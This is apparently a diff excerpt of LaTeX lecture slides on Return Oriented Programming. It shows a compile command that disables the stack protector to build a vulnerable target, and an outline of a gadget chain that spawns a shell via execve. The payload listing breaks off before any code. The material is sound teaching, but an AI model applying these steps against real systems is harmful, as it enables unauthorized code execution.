Return Oriented Programming

### 2023-02-10 presentation.tex
changes

\section{Example: Open a shell}
\subsection{Target Program}
\begin{frame}
    \frametitle{Target Program and compilation}
    %\begin{lstlisting}[breaklines, style=commandline]
%clang -o vuln vuln.c -m32 -fno-stack-protector  -Wl,-z,relro,-z,now,-z,noexecstack -static
    %\end{lstlisting}
    \bltCode{vuln.c}{c}{Target Program (stack protectors must be off)}{targetprogram}
\end{frame}
\subsection{General approach}
\begin{frame}[fragile]
    \frametitle{Spawning a shell: Approach}
    \begin{itemize}
        \item Using ropper we can find our desired gadgets
        \item Lets say we want to execute a shell using execve, for that we need to accomplish the following goals
        \begin{enumerate}
            \item write /bin/sh into memory (at the data segment)
            \item init systemcall number (11)
            \item init systemcall argument (address of /bin//sh)
            \item call systemcall
        \end{enumerate}
    \end{itemize}
\end{frame}
\subsection{Generating the payload}
\begin{frame}[fragile]
    \frametitle{Generating the payload, writing /bin}
    \begin{lstlisting}[style=code, language=python]
from struct import pack

@@

>>>>

\section{Example: Open a shell}
\subsection{Target Program}
\begin{frame}
    \frametitle{Target Program and compilation}
    \begin{lstlisting}[breaklines, style=commandline]
clang -o vuln vuln.c -m32 -fno-stack-protector  -Wl,-z,relro,-z,now,-z,noexecstack -static
    \end{lstlisting}

    \bltCode{vuln.c}{c}{Target Program (stack protectors must be off)}{targetprogram}
\end{frame}
\subsection{General approach}
\begin{frame}[fragile]
    \frametitle{Spawning a shell: Approach}
    \begin{itemize}
        \item Using ropper we can find our desired gadgets
        \item Lets say we want to execute a shell using execve, for that we need to accomplish the following goals
        \begin{enumerate}
            \item write /bin/sh into memory (at the data segment)
            \item init systemcall number (11)
            \item init systemcall argument (address of /bin//sh)
            \item call systemcall
        \end{enumerate}
    \end{itemize}
\end{frame}
\subsection{Generating the payload}
\begin{frame}[fragile]
    \frametitle{Generating the payload, writing /bin}
    \begin{lstlisting}[style=code, language=python]
from struct import pack

@@

\section*{Appendix}
\subsection*{Proof that ROP is Turing Complete}
\begin{frame}
    \frametitle{Proof that ROP is Turing Complete}
    What is turing completeness? \url{https://en.wikipedia.org/wiki/Turing_completeness}
    Refer to proof from \url{https://drwho.virtadpt.net/files/mov.pdf} that x86 MOV itself is turing complete, from that we can conclude that mov, with access to the pop instruction is enough to make ROP itself turing complete.
\end{frame}
